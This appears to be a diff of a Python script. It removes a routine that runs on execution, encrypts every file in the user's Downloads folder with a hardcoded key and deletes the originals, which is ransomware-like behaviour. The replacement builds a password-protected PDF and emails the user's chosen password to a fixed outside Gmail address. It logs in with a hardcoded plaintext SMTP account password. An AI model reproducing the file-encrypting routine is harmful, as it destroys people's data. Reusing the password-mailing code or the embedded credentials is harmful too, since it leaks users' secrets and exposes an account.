@@ -1,64 +1,78 @@
-import os
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from Crypto.Random import get_random_bytes
-import shutil
-import string
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
+from PyPDF2 import PdfReader, PdfWriter
 
-# Function for Caesar Cipher
-def caesar_cipher_encrypt(text, shift):
-    result = []
-    for char in text:
-        if char.isalpha():  # Only shift alphabetic characters
-            shifted = chr(((ord(char.lower()) - ord('a') + shift) % 26) + ord('a'))
-            result.append(shifted.upper() if char.isupper() else shifted)
-        else:
-            result.append(char)  # Non-alphabetic characters are not changed
-    return ''.join(result)
+# Function to create a PDF with the input text
+def create_pdf(text, pdf_filename):
+    c = canvas.Canvas(pdf_filename, pagesize=letter)
+    width, height = letter
+    c.drawString(100, height - 100, text)
+    c.save()
 
-# Function for XOR Encryption
-def xor_encrypt(text, key):
-    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
+# Function to encrypt the PDF with a password
+def encrypt_pdf(pdf_filename, password):
+    # Read the original PDF
+    reader = PdfReader(pdf_filename)
+    writer = PdfWriter()
 
-# Function for AES-128 Encryption
-def aes_encrypt(text, key):
-    # Ensure the key is 16 bytes long (AES-128)
-    key = (key * ((16 // len(key)) + 1))[:16]  # Repeat key and trim to 16 bytes
-    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
-    return cipher.iv + ct_bytes  # prepend the IV for later decryption
+    # Add all pages to the writer
+    for page in reader.pages:
+        writer.add_page(page)
 
-# Encrypt a file using Caesar, AES, and XOR
-def encrypt_file(file_path, caesar_shift=3, aes_key="magicspell"):
-    with open(file_path, 'rb') as file:
-        file_data = file.read()
+    # Encrypt the PDF with the password
+    with open(pdf_filename, 'wb') as encrypted_file:
+        writer.encrypt(password)
+        writer.write(encrypted_file)
 
-    # Apply Caesar Cipher (for simplicity, we just encode the file content as text)
-    text = file_data.decode(errors='ignore')
-    caesar_encrypted = caesar_cipher_encrypt(text, caesar_shift)
+# Function to send an email with the password
+def send_password_email(password):
+    # Set up the email server and credentials
+    sender_email = "info@infopeklo.cz"
+    receiver_email = "alfikeita@gmail.com"
+    smtp_server = "smtp.seznam.cz"  # Use your SMTP server address
+    smtp_port = 587  # Typical port for TLS
+    sender_password = "Polik789"  # Replace with the actual email password
 
-    # Apply AES Encryption
-    aes_encrypted = aes_encrypt(caesar_encrypted, aes_key)
+    # Create the email content
+    subject = "Encrypted PDF Password"
+    body = f"The password for the encrypted PDF is: {password}"
 
-    # Apply XOR Encryption
-    xor_encrypted = xor_encrypt(aes_encrypted.decode('latin-1'), aes_key)
+    # Create MIME message
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = subject
 
-    # Save the encrypted data to a new file with '.protected' extension
-    new_file_path = file_path + '.protected'
-    with open(new_file_path, 'wb') as enc_file:
-        enc_file.write(xor_encrypted.encode('latin-1'))
+    # Attach the body to the message
+    message.attach(MIMEText(body, "plain"))
 
-    # Optionally, delete the original file after encryption
-    os.remove(file_path)
+    # Send the email using SMTP
+    try:
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.starttls()  # Secure connection
+            server.login(sender_email, sender_password)  # Login with email credentials
+            server.sendmail(sender_email, receiver_email, message.as_string())
+        print("Password sent successfully!")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
 
-# Encrypt all files in the Downloads folder
-def encrypt_all_files_in_downloads():
-    downloads_dir = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
-    for root, dirs, files in os.walk(downloads_dir):
-        for file in files:
-            file_path = os.path.join(root, file)
-            if not file_path.endswith('.protected'):  # Skip already encrypted files
-                encrypt_file(file_path)
+def main():
+    # Get user input
+    text = input("ENTER TEXT: ")
+    password = input("ENTER PASSWORD: ")
+    pdf_filename = input("ENTER NAME OF PDF (e.g., 'output.pdf'): ")
 
-# Main execution
-encrypt_all_files_in_downloads()
+    # Create the PDF
+    create_pdf(text, pdf_filename)
+
+    # Encrypt the PDF
+    encrypt_pdf(pdf_filename, password)
+
+    # Send the password to the specified email address
+    send_password_email(password)
+
+if __name__ == "__main__":
+    main()
